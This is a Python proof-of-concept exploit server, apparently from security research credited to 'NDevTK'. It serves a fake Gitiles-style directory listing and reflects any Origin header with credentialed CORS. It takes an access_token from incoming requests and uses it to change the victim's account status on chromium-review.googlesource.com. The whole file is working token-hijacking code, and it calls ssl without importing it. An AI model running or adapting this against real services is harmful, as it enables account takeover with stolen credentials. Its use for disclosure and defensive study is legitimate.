import json
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import requests
from datetime import datetime

PORT = 1338

dir_response = {
    "id": "b939af01ca07f0caa68fb8d264a68b91e86efe70",
    "entries": [
        {
            "mode": 33188,
            "type": "blob",
            "id": "54c90ede642a93580a98eb4ed6e821749b04a989",
            "name": ".gitignore",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "daebd5231a3ec9aafd58e6f4075f3b63e4c3bd53",
            "name": "Changes.md",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "957da92f63926bf6013845f0ff0602d1f1620e0a",
            "name": "CleanSpec.mk",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "74b54fadd522b739407d7d71b4ea3503fc666aeb",
            "name": "Deprecation.md",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "44781a70880412fdd9007cc2bec16a4b09924c6d",
            "name": "METADATA",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "97fda40f7b2006ae5f6bc895a4a1d602ceb991c6",
            "name": "OWNERS",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "ce7515044e84d15868077c0a8319fc401442fc4d",
            "name": "PREUPLOAD.cfg",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "47809a95ac45ec11840166adac5eb31d3ed9c788",
            "name": "README.md",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "ea4788a1bc26b698697f9a1499cd2164e0d03d3d",
            "name": "Usage.txt",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "b31578a29b5c64e4fa690b8f4062e045ba01185a",
            "name": "buildspec.mk.default",
        },
        {
            "mode": 16384,
            "type": "tree",
            "id": "9a970257168359bda2226ac81dd945e41a3db224",
            "name": "common",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "004788a1bc26b698697f9a1499cd2164e0d03d3d",
            "name": "HELLO_FROM_AO.txt",
        },
        {
            "mode": 33188,
            "type": "blob",
            "id": "00970257168359bda2226ac81dd945e41a3db224",
            "name": "HELLO_FROM_AO_SERVER",
        },
    ],
}


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        origin = self.headers.get("Origin")
        if origin:
            self.send_header("Access-Control-Allow-Origin", origin)
            self.send_header("Access-Control-Allow-Credentials", "true")
        self.send_response(200)
        self.end_headers()

        query = parse_qs(urlparse(self.path).query)
        fmt = query.get("format", [None])[0]
        if fmt == "JSON":
            self.wfile.write(b")]}'" + json.dumps(dir_response).encode())
        elif fmt == "TEXT":
            self.wfile.write(b"TEXT RESPONSE")
        else:
            self.wfile.write(b"Hello World")

        access_token = query.get("access_token", [None])[0]
        if not access_token:
            return

        payload_timestamp = datetime.now()
        payload = {
            "status": f"Hello from PoC by NDevTK. This field was set on {payload_timestamp} by PoC script hosted on Alesandro Ortiz's server."
        }
        url = f"https://chromium-review.googlesource.com/a/accounts/self/status?access_token={access_token}"
        headers = {"Content-Type": "application/json"}
        requests.put(url, headers=headers, data=json.dumps(payload))


httpd = HTTPServer(("0.0.0.0", PORT), Handler)
httpd.socket = ssl.wrap_socket(
    httpd.socket, keyfile="privkey.pem", certfile="fullchain.pem", server_side=True
)
print(f"Server running on port {PORT}")
httpd.serve_forever()
